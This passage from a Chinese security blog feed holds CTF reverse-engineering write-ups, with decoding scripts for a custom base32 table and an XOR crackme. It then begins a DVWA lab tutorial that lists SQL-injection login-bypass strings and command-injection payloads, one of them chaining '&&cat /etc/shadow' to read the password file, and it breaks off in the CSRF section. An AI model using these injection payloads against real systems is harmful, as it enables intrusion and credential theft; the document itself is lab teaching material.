value</span><br><span class="line">    xor eax, edx</span><br><span class="line">    stosd</span><br><span class="line">    ;push 20746567</span><br><span class="line">    xor eax, 10a3e          ;second dword</span><br><span class="line">    stosd</span><br><span class="line">    ;push 217469</span><br><span class="line">    xor eax, ebx            ;22706b8c, third dword</span><br><span class="line">    xor eax, 22511e14</span><br><span class="line">    stosd</span><br><span class="line">    ;mov eax, 401044</span><br><span class="line">    xor eax, 61642d</span><br><span class="line">    jmp ret1</span><br><span class="line">bad_boy:</span><br><span class="line">    ;mov eax, 40103f</span><br><span class="line">    pop eax         ;eax&#x3D;413131, addr of very2</span><br><span class="line">    xor eax, 1210e</span><br><span class="line">ret1:</span><br><span class="line">    xor eax, DWORD ptr cFlag</span><br><span class="line">    jmp eax</span><br><span class="line">    nop</span><br><span class="line">    ;ret</span><br><span class="line"> </span><br><span class="line">very2   endp</span><br></pre></td></tr></table></figure></div><hr><p>完结</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc&quot;&gt;&lt;a href=&quot;#看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc&quot; class=&quot;headerlink&quot; title=&quot;看雪.TSRC 2017CTF秋季赛</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="缓冲区溢出" scheme="https://kabeor.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>2017第二届广东省强网杯线上赛Nonstandard</title>
    <link href="https://kabeor.github.io/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/"/>
    <id>https://kabeor.github.io/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-05-03T04:39:18.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2017第二届广东省强网杯线上赛Nonstandard"><a href="#2017第二届广东省强网杯线上赛Nonstandard" class="headerlink" title="2017第二届广东省强网杯线上赛Nonstandard"></a>2017第二届广东省强网杯线上赛Nonstandard</h1><h2 id="OD分析"><a href="#OD分析" class="headerlink" title="OD分析"></a>OD分析</h2><p>先运行一下，输入错误的话直接退出<br><a href="https://i.loli.net/2018/07/15/5b4b3ffb6e2c6.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffb6e2c6.jpg" class="lazyload"></a><br>查壳发现无壳，VC++2013写的</p><p>拖进OD，先搜索字符串，非常明显<br><a href="https://i.loli.net/2018/07/15/5b4b3ffb820be.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffb820be.jpg" class="lazyload"></a><br>在Please Input Flag后面和yes前的cmp判断下断点<br>运行起来跟一下，发现call Nonstand.00401480是对我们输入的字符串做变换，看来又是个算法题了，IDA-F5吧</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>找到提示所在位置，F5<br><a href="https://i.loli.net/2018/07/15/5b4b3ffb9c042.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffb9c042.jpg" class="lazyload"></a><br>看起来非常简单啊<br>我们只需要让sub_401480函数等于1就好了，所以我们进去看看<br><a href="https://i.loli.net/2018/07/15/5b4b3ffbaf837.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffbaf837.jpg" class="lazyload"></a><br>v1是我们输进去的，sub_401070是对输入的进行变换，得到v2<br>然后就是对每一位进行移位操作后与byte_402120进行比较<br>byte_402120的值为<br><a href="https://i.loli.net/2018/07/15/5b4b3ffbc388a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffbc388a.jpg" class="lazyload"></a></p><pre><code>nAdtxA66nbbdxA71tUAE2AOlnnbtrAp1nQzGtAQGtrjC7===</code></pre><p>千万注意前面的n，差点让坑</p><p>然后我们就只需要分析sub_401070这个变换了，打开以后，</p><p>wtf。。。</p><p><a href="https://i.loli.net/2018/07/15/5b4b3ffbd705a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffbd705a.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/15/5b4b3ffbea9c0.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffbea9c0.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/15/5b4b3ffc0ae91.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffc0ae91.jpg" class="lazyload"></a><br>我就只截取关键部分了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">        v14 = v13;</span><br><span class="line">        HIDWORD(v15) = v19;</span><br><span class="line">        LODWORD(v15) = v23 &amp; <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">        HIDWORD(v16) = v30 | ((<span class="keyword">unsigned</span> __int64)(v18 &amp; <span class="number">1</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">        LODWORD(v16) = (((v23 &amp; <span class="number">0xFFFFFFF8</span>) &lt;&lt; <span class="number">8</span>) + (v18 &amp; <span class="number">0xFFFFFFC0</span> | ((v23 &amp; <span class="number">7</span>) &lt;&lt; <span class="number">8</span>)) + (v18 &amp; <span class="number">0x3E</span>)) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">        v17 = ((v14 &amp; <span class="number">0x1F</span>)</span><br><span class="line">             + __PAIR__(</span><br><span class="line">                 HIDWORD(v14) | (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)(v20 &amp; <span class="number">3</span>) &gt;&gt; <span class="number">24</span>),</span><br><span class="line">                 v14 &amp; <span class="number">0xFFFFFFE0</span> | ((v20 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">             + ((__PAIR__(</span><br><span class="line">                   v31 | (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)(v21 &amp; <span class="number">0xF</span>) &gt;&gt; <span class="number">24</span>),</span><br><span class="line">                   v20 &amp; <span class="number">0xFFFFFF80</span> | ((v21 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">               + ((__PAIR__(</span><br><span class="line">                     (__PAIR__(v15 &gt;&gt; <span class="number">24</span>, (v23 &amp; <span class="number">0xFFFFFFF8</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">                    + __PAIR__(</span><br><span class="line">                        v29 | (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)(v23 &amp; <span class="number">7</span>) &gt;&gt; <span class="number">24</span>),</span><br><span class="line">                        v18 &amp; <span class="number">0xFFFFFFC0</span> | ((v23 &amp; <span class="number">7</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">                    + (v18 &amp; <span class="number">0x3E</span>)) &gt;&gt; <span class="number">24</span>,</span><br><span class="line">                     v21 &amp; <span class="number">0xFFFFFFF0</span> | ((v18 &amp; <span class="number">1</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">                 + v16) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">               + (v20 &amp; <span class="number">0x7C</span>)) &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">        HIDWORD(v14) = (v14 &amp; <span class="number">0x1F</span>)</span><br><span class="line">                     + (v14 &amp; <span class="number">0xFFFFFFE0</span> | ((v20 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">                     + (((v20 &amp; <span class="number">0xFFFFFF80</span> | ((v21 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">                       + (((v21 &amp; <span class="number">0xFFFFFFF0</span> | ((v18 &amp; <span class="number">1</span>) &lt;&lt; <span class="number">8</span>)) + (_DWORD)v16) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">                       + (v20 &amp; <span class="number">0x7C</span>)) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        *v24 = byte_403020[(<span class="keyword">unsigned</span> __int8)v17 &gt;&gt; <span class="number">3</span>];</span><br><span class="line">        v24[<span class="number">1</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">30</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v24[<span class="number">2</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">25</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v24[<span class="number">3</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v24[<span class="number">4</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v24[<span class="number">5</span>] = byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        LOBYTE(v16) = __PAIR__(v17, HIDWORD(v14)) &gt;&gt; <span class="number">5</span>;</span><br><span class="line">        v3 = v25;</span><br><span class="line">        v24[<span class="number">6</span>] = byte_403020[v16 &amp; <span class="number">0x1F</span>];</span><br><span class="line">        LOBYTE(v16) = byte_403020[BYTE4(v14) &amp; <span class="number">0x1F</span>];</span><br><span class="line">        v2 = v32;</span><br><span class="line">        v24[<span class="number">7</span>] = v16;</span><br><span class="line">        v24 += <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v8 &lt; v25 );</span><br><span class="line">      result = v28;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v22 &gt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">memset</span>(&amp;result[v26], <span class="number">61u</span>, v22);</span><br><span class="line">    *(&amp;v28[v26] + v22) = <span class="number">0</span>;</span><br><span class="line">    result = v28;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这么一大堆有点烦啊，想到我们要做对比的那一串是base64编码的，那么这个算法是不是呢，仔细看一下发现和base64结构相似，但这里<br><code>LODWORD(v16) = (((v23 &amp; 0xFFFFFFF8) &lt;&lt; 8) + (v18 &amp; 0xFFFFFFC0 | ((v23 &amp; 7) &lt;&lt; 8)) + (v18 &amp; 0x3E)) &lt;&lt; 8;</code><br>和</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v24[1] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 30) &amp; 0x1F];</span><br><span class="line">v24[2] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 25) &amp; 0x1F];</span><br><span class="line">v24[3] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 20) &amp; 0x1F];</span><br><span class="line">v24[4] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 15) &amp; 0x1F];</span><br><span class="line">v24[5] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 10) &amp; 0x1F];</span><br></pre></td></tr></table></figure></div><p>每次取5个比特，分别赋给8个值，每个值5个位 ,这是base32</p><blockquote><p>base64编码是用64（2的6次方）个ASCII字符来表示256（2的8次方）个ASCII字符，也就是三位二进制数组经过编码后变为四位的ASCII字符显示，长度比原来增加1/3。</p></blockquote><blockquote><p>同样，base32就是用32（2的5次方）个特定ASCII码来表示256个ASCII码。所以，5个ASCII字符经过base32编码后会变为8个字符（公约数为40），长度增加3/5.不足8n用“=”补足。</p></blockquote><blockquote><p>base16就是用16（2的4次方）个特定ASCII码表示256个ASCII字符。1个ASCII字符经过base16编码后会变为2个字符，长度增加一倍。不足2n用“=”补足</p></blockquote><p>好的，还有最后一个坑<br><a href="https://i.loli.net/2018/07/15/5b4b3ffc20116.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffc20116.jpg" class="lazyload"></a><br>这莫名其妙的sub_401000，点进去<br><a href="https://i.loli.net/2018/07/15/5b4b3ffc33cd8.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3ffc33cd8.jpg" class="lazyload"></a><br>这里是重新修改的密码表了，</p><ol><li><p>字母倒序</p></li><li><p>奇数小写偶数大写</p></li><li><p>后面又加入765321<br>所以表的顺序是</p><p> zYxWvUtSrQpOnMlKjIhGfEdCbA765321</p></li></ol><p>那我们自己写一个解密脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; &quot;nAdtxA66nbbdxA71tUAE2AOlnnbtrAp1nQzGtAQGtrjC7&#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">table &#x3D; &quot;zYxWvUtSrQpOnMlKjIhGfEdCbA765321&quot;</span><br><span class="line"></span><br><span class="line">def find(x):</span><br><span class="line">    if(x&#x3D;&#x3D;&#39;&#x3D;&#39;):</span><br><span class="line">        return 0</span><br><span class="line">    return table.index(x)</span><br><span class="line"></span><br><span class="line">for i in range(len(s)&#x2F;&#x2F;8):</span><br><span class="line">    p &#x3D; s[i*8:i*8+8]</span><br><span class="line">    t &#x3D; 0</span><br><span class="line">    for j in p:</span><br><span class="line">        t &#x3D; t&lt;&lt;5</span><br><span class="line">        t +&#x3D; find(j)</span><br><span class="line">    for j in range(5):</span><br><span class="line">        print(chr((t&amp;0xff00000000)&gt;&gt;32), end&#x3D;&#39;&#39;)</span><br><span class="line">        t &#x3D; t&lt;&lt;8</span><br></pre></td></tr></table></figure></div><p>运行得到flag<br><a href="https://i.loli.net/2018/07/15/5b4b401d5d58c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b401d5d58c.jpg" class="lazyload"></a></p><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>一共发现了两个彩蛋，一个在OD里，一个在IDA里</p><p>OD的找不到位置了。。。</p><pre><code>ZmxhZyU3QmZsYWdfaXNfbm90X21lJTIxJTdE</code></pre><p>IDA的<br><a href="https://i.loli.net/2018/07/15/5b4b401d716f2.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b401d716f2.jpg" class="lazyload"></a></p><pre><code>ZmxhZ3tmbGFnX2lzX25vdF9tZSF9</code></pre><p>具体是什么，你可以拿base64解一下试试</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;2017第二届广东省强网杯线上赛Nonstandard&quot;&gt;&lt;a href=&quot;#2017第二届广东省强网杯线上赛Nonstandard&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    
    <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
    <category term="Reserve" scheme="https://kabeor.github.io/tags/Reserve/"/>
    
    <category term="CTF" scheme="https://kabeor.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2018.2 MOCTFcrackme2 WriteUp</title>
    <link href="https://kabeor.github.io/2018.2%20MOCTFcrackme2%20WriteUp/"/>
    <id>https://kabeor.github.io/2018.2%20MOCTFcrackme2%20WriteUp/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:52:48.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018-2-MOCTFcrackme2-WriteUp"><a href="#2018-2-MOCTFcrackme2-WriteUp" class="headerlink" title="2018.2 MOCTFcrackme2 WriteUp"></a>2018.2 MOCTFcrackme2 WriteUp</h1><h2 id="1-随意看看"><a href="#1-随意看看" class="headerlink" title="1. 随意看看"></a>1. 随意看看</h2><blockquote><p>拿到题以后打开<br><a href="https://i.loli.net/2018/07/14/5b49f704f2880.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49f704f2880.jpg" class="lazyload"></a><br>随便输入以后回车，程序直接退出</p></blockquote><blockquote><p>查壳<br>VC++6.0写的，不放图了</p></blockquote><h2 id="OD分析"><a href="#OD分析" class="headerlink" title="OD分析"></a>OD分析</h2><h3 id="字符串搜索"><a href="#字符串搜索" class="headerlink" title="字符串搜索"></a>字符串搜索</h3><p><a href="https://i.loli.net/2018/07/15/5b4b3f4c85bcf.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f4c85bcf.jpg" class="lazyload"></a></p><p>先到Your get the flag， but it ….看看<br><a href="https://i.loli.net/2018/07/15/5b4b3f6b98498.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6b98498.jpg" class="lazyload"></a></p><h2 id="分析跳转"><a href="#分析跳转" class="headerlink" title="分析跳转"></a>分析跳转</h2><p>这个地方有个跳转，也就是判断你输的flag对不对的<br>但是这个跳转如果爆破是没什么用的，因为你并不能得出真正的flag<br>翻到上面<br><a href="https://i.loli.net/2018/07/15/5b4b3f6bbac09.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6bbac09.jpg" class="lazyload"></a><br>可以看到有一行</p><pre><code>10&lt;1&lt;&gt;;?8:%w!##&amp;#q./,x(,((</code></pre><p>这其实是接下来要与你输入的字符做比较<br>在jnz判断前面的test下断点，从这段开头的push往下执行，执行到输入字符后，这时候返回来看看寄存器窗口，会发现<br><a href="https://i.loli.net/2018/07/15/5b4b3f6beb859.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6beb859.jpg" class="lazyload"></a><br>ECX里是要比较的字符串，EDX里是你刚刚输入的，而且被加密了，因此我们接下来要做的就是分析这个加密的原理</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><h3 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h3><p>分析算法当然是IDA的F5大法了<br>找到刚刚那一段，F5<br><a href="https://i.loli.net/2018/07/15/5b4b3f6c0c2d4.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6c0c2d4.jpg" class="lazyload"></a><br>这就是整个算法了</p><p>可以看到，我们输入字符串之后，它把每一位都代入sub_4010CD,转换后得出新的组合<br>于是我们应该跟进去<br><a href="https://i.loli.net/2018/07/15/5b4b3f6c1fb7c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6c1fb7c.jpg" class="lazyload"></a><br>再跟<br><a href="https://i.loli.net/2018/07/15/5b4b3f6c31997.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6c31997.jpg" class="lazyload"></a><br>好了，这就是它的加密算法核心了，先看看这个dword是什么<br><a href="https://i.loli.net/2018/07/15/5b4b3f6c44a3c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6c44a3c.jpg" class="lazyload"></a><br>就是数字6</p><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>所以这回就彻底清楚了<br><strong>我们把字符串输入进去，它把每一位都和这个dword做了异或，而dword从6开始累加，最后输出的v7与它原来的做比较</strong></p><p>所以依靠这个思路写一个c++程序,不要在意头文件。。。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"10&lt;1&lt;&gt;;?8:%w!##&amp;#q./,x(,(("</span>;</span><br><span class="line"><span class="keyword">char</span> v[<span class="number">100</span>] = &#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">26</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, v[i] ^ s[i]);</span><br><span class="line"><span class="built_in">cin</span>.<span class="built_in">get</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里直接带入</p><pre><code>10&lt;1&lt;&gt;;?8:%w!##&amp;#q./,x(,((</code></pre><p>就可以，因为两次异或抵消，所以加密前的带入得出加密后的，加密后<br>的带入也就能得到加密前的</p><p>所以得出结果<br><a href="https://i.loli.net/2018/07/15/5b4b3f6c58fde.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6c58fde.jpg" class="lazyload"></a></p><pre><code>77486572655f30735f666c4167</code></pre><p>代进程序里试试<br><a href="https://i.loli.net/2018/07/15/5b4b3f6c6cc7f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6c6cc7f.jpg" class="lazyload"></a></p><p>不过怎么看也不像是flag，况且给提示了，所以应该是被其他加密方式加密了吧</p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>26位肯定不是MD5，长的像的只有16进制了，尝试后发现16进制转文本就是真正的flag<br><a href="https://i.loli.net/2018/07/15/5b4b3f6c8093b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f6c8093b.jpg" class="lazyload"></a><br>就是下面这个了</p><pre><code>wHere_0s_flAg</code></pre><p>再带上格式<br><a href="https://i.loli.net/2018/07/15/5b4b3f7c9fb7d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b3f7c9fb7d.jpg" class="lazyload"></a></p><p>轻松+200</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;2018-2-MOCTFcrackme2-WriteUp&quot;&gt;&lt;a href=&quot;#2018-2-MOCTFcrackme2-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;2018.2 MOCTFcrackme2</summary>
        
      
    
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="CTF" scheme="https://kabeor.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>DVWA的安装与Low级别的web漏洞</title>
    <link href="https://kabeor.github.io/DVWA%20low%E7%BA%A7%E5%88%AB%E6%B5%8B%E8%AF%95/"/>
    <id>https://kabeor.github.io/DVWA%20low%E7%BA%A7%E5%88%AB%E6%B5%8B%E8%AF%95/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-05-03T04:37:39.487Z</updated>
    
    <content type="html"><![CDATA[<p>#DVWA的安装与Low级别的web漏洞<br>    <a href="http://www.freebuf.com/author/lonehand" target="_blank" rel="noopener">http://www.freebuf.com/author/lonehand</a><br>##安装DVWA<br>进入github下载: <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>把解压后的文件放在WWW文件夹下<br>进入DVWA，打开config目录里的config.inc.php<br>修改数据库账号密码</p><pre><code>$_DVWA = array();$_DVWA[ &apos;db_server&apos; ]   = &apos;127.0.0.1&apos;;$_DVWA[ &apos;db_database&apos; ] = &apos;dvwa&apos;;$_DVWA[ &apos;db_user&apos; ]     = &apos;root&apos;;$_DVWA[ &apos;db_password&apos; ] = &apos;123&apos;;</code></pre><p>打开<a href="http://127.0.0.1/DVWA/setup.php，点击下面的按钮，这样就会创建数据库了" target="_blank" rel="noopener">http://127.0.0.1/DVWA/setup.php，点击下面的按钮，这样就会创建数据库了</a><br>（密码需要和MYSQL密码一致，忘记可在phpstudy中重置）</p><p>创建好后自动跳转到登陆首页<br>默认账号密码admin/password<br><a href="https://i.loli.net/2017/11/14/5a0ada8bf1286.png" data-fancybox="group" data-caption="20170208221234546.png" class="fancybox"><img alt="20170208221234546.png" title="20170208221234546.png" data-src="https://i.loli.net/2017/11/14/5a0ada8bf1286.png" class="lazyload"></a></p><blockquote><p>allow_url_include的修改</p></blockquote><p>phpstudy默认为off<br>去phpinfo看Loaded Configuration File发现指向C:\phpstudy\php\php-5.4.45\php.ini，于是去这里查找并修改off为on</p><p>##Low级别测试<br>DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。<br>###Brute Force（暴力（破解））</p><blockquote><p>方法一</p></blockquote><p>1.抓包<br>2.右键将包发送到intruder中<br>3.把默认变量全部清除，然后选中密码，单击“Add”按钮将之设为需要破解的变量<br>4.由于只有一个变量，因而“Attack type”攻击类型这里选择Sniper。<br>然后在“Payloads”选项中进行设置，由于只有一个变量，因而“Payload set”自动设置为1，“Payload type”这里设置为“Brute forcer”。在下面的“Payload Options”中设置暴力破解所采用的字符集，以及最小和最大密码长度。<br>5.在菜单栏中选择“Intruder/Start attack”，就可以开始暴力破解<br>6尝试在爆破结果中找到正确的密码，可以看到password的响应包长度与众不同</p><blockquote><p>方法二</p></blockquote><ol><li><p>Username: admin’ or ’1′=’1<br>Password:（空）<br>注入成功</p></li><li><p>Username: admin’ #<br>Password :（空）<br>注入成功</p></li></ol><p>###Command Injection（命令行注入）<br>命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一</p><blockquote><p>漏洞利用</p></blockquote><p>window和linux系统都可以用&amp;&amp;来执行多条命令</p><pre><code>127.0.0.1&amp;&amp;net user</code></pre><p>Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件</p><p>###CSRF（跨站请求伪造）<br>CSRF，全称Cross-site request 